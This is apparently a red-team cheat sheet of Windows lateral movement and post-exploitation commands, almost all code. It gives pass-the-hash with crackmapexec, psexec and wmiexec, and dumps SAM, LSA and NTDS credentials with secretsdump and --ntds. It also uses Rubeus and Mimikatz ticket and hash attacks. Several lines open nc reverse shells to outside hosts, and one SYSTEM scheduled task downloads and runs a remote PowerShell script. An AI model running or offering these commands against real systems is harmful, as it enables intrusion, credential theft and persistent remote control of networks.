
### Service Controller
 prior to Red Team assessment popular, Service Controller is part of post exploitation phrases to elevate to higher priviledge.
 ```
shell dir \\web01.insomnia.io\c$
shell copy Webex.exe \\web01.insomnia.io\C$\windows\Tasks\Webex.exe
shell sc \\web01.insomnia.io create EvilService binpath= "C:\Windows\Tasks\Webex.exe"
shell sc qc \\web01.insomnia.io ExampleService
shell sc \\web01.insomnia.io start ExampleService
 ```

### Crackmapexec
```
PsExec64.exe \\192.168.1.104 -u administrator -p forever cmd 
psexec \\192.168.122.66 -u Administrator -p 123456Ww ipconfig
psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t ipconfig 
crackmapexec 192.168.100.1/24 
crackmapexec cme-hosts.txt --shares 
cme-hosts.txt -u username.txt -p password.txt --shares 
crackmapexec 192.168.100.10 -u Administrator -p 'Passw0rd!' -x "net users" 
crackmapexec smb 192.168.100.1/24 -u Administrator -p 'Passw0rd!' -x "net users" 
crackmapexec smb 192.168.100.1/24 -u Administrator -H  aad3b435b51404eeaad3b435b51404ee  -x "hostname" 
crackmapexec smb 192.168.100.1/24 -u Administrator -H  aad3b435b51404eeaad3b435b51404ee  -x "hostname" 
crackmapexec smb 192.168.100.10 -u Administrator -H aad3b435b51404eeaad3b435b51404ee --sam            
crackmapexec smb 192.168.100.10 -u Administrator -H  aad3b435b51404eeaad3b435b51404ee --lsa  
crackmapexec smb 192.168.100.10 -u 'Administrator' -H aad3b435b51404eeaad3b435b51404ee --ntds drsuapi
pth-rpcclient -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee //192.168.1.25 

PsExec64.exe \\insomnia.io cmd 


```
### Impacket
```
psexec.py Resilient-Ninja:123456@192.168.200.1 ipconfig 
wmiexec.py Resilient-Ninja:123456@192.168.200.1 ipconfig 
python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee Administrator@192.168.100.10 #with hash 
python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee -just-dc acmebank.loca/Administrator@192.168.100.10 

```

### Windows Management Instrumentation

```
wmic /node:"web01" /user:"insomnia.io\Spider01" /password:"Spider01@" process call create "powershell -enc [...snip...]"

#Powershell Function
#Basic Recon
Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct

#To Identify whether The WinRM is being ran on target

Get-WmiObject -Query "select * from win32_service where name='WinRM'" -ComputerName 192.168.100.10, 192.168.100.20 | Format-List -Property PSComputerName, Name, ExitCode, Name, ProcessID, StartMode, State, Status

Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell.exe -ep bypass'
Get-WmiObject -Class Win32_Process -ComputerName 192.168.72.134 -Credential ‘insomnia.io\Spider01
```
### WMI Over Kerberos Ticket
```
wmic /authority:"Kerberos: Domain DC_Hostname“ / DC_hostname process call create 
wmic /authority:"kerberos:insomnia.io\john" /node:insomnia.io  path win32_process call create calc.exe
wmic /authority:"kerberos:insomnia.io\john" /node:insomnia.io  "cmd /c ipconfig"
wmic /authority:"Kerberos:DOMAIN REMOTE" /node:REMOTE process call create " Windows System32 nodepad.exe"
```
  ### PowerShell Remoting
 ```

PowerShell Invoke-Command -ComputerName Web01 -ScriptBlock { hostname; whoami }
PowerShell $pass=ConvertTo-SecureString "Spider01@" -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential("insomnia.io\wob01", $pass)
Invoke-Command -ComputerNameweb01 -ScriptBlock { hostname; whoami } -Credential $cred

Get-PSSession
Enter-PsSession -id 1

Invoke-Command -ComputerName insomnia.io -Credential $Cred  -ScriptBlock {hostname}
Invoke-Command -ComputerName insomnia.io -Credential $Cred  -ScriptBlock {cmd.exe /c nc.exe -v 192.168.100.100 7777 -e cmd.exe}
Copy-Item -Path C:\Users\itemployee35\Desktop\Tools\PowerView.ps1 -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 11)
Copy-Item -Path C:\Users\itemployee35\Desktop\Tools\rubeus.exe -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 11)
Copy-Item -Path C:\Users\itemployee35\Desktop\Tools\Invoke-Mimikatz.ps1 -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 1)


```
### Evil-WinRM
 
```
proxychains evil-winrm -u Spider01 -H REDACTED -i 192.168.100.10
```

### Runas
```
runas /netonly /user:nyameeeain "C:\Windows\System32\calc.exe"
runas /netonly /user:nyameeeain powershell
runas /netonly /user:nyameeeain "C:\Program Files\HeidiSQL\heidisql.exe"
runas /netonly /user:insomnia\nyameeeain "C:\Windows\System32\calc.exe"
```
### Overpass-the-Hash
A logon session can only accommodate one TGT at a time.If we pass n.lamb’s TGT into the current session (running as j.hunt), we’re going to cause some bad things to happen.
So we can use the MakeToken task with dummy credentials, to create a sacrificial logon session that we can pass n.lamb’s TGT into instead.
```
Rubeus asktgt /user:n.lamb /rc4:REDACTED
MakeToken n.lamb insomnia.io DoesNotMatter
Rubeus ptt /ticket:doIFXDCCBVi[...snip...]bDWN5YmVyYm90aWMuaW8=
```

# SMB Name Pipe Pivoting
```
$hosts = @("192.168.100.10","192.168.100.30","192.168.100.199","192.168.100.199")
foreach ($h in $hosts) {Invoke-WMIExec -Target $h -Domain insomnia.io -Username Administrator -Hash 01C7B72061EE0AE755269C885A99B86F -Command "hostname" -verbose}

```
# Schedule
```
schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr 'c:\Users\User\Downloads/nc.exe 192.168.56.103 1337 -e cmd.exe'
schtasks /create /S web01.insomnia.io /SC Weekly /RU "NT Authority\SYSTEM" /TN "Give_Me" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.100:9090/1.ps1''')'"


```

# Mimikatz Process Spawn
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Join /domain:insomnia.io /ntlm:01C7B72061EE0AE755269C885A99B86F /run:powershell.exe"'

```
